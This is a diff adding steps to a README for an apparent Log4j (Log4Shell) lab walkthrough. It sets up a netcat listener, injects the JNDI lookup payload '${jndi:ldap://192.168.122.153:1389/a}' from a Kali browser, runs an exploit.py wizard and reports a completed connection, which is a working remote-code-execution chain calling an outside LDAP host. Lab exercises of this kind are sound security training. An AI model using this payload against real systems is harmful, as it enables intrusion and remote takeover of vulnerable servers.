@@ -25,6 +25,12 @@ nc -lnvp 9001
 ```
 ![Alt text](https://github.com/deimergruesobar/log4j-testing/blob/main/log4j/img/nc.png)
 
-
+In the web browser of Kali excecute 
+```
+${jndi:ldap://192.168.122.153:1389/a}
+```
 Follow the wizard in the exploit.py shell 
 ![Alt text](https://github.com/deimergruesobar/log4j-testing/blob/main/log4j/img/jndi.png)
+
+Connection completed
+![Alt text](https://github.com/deimergruesobar/log4j-testing/blob/main/log4j/img/connected.png)
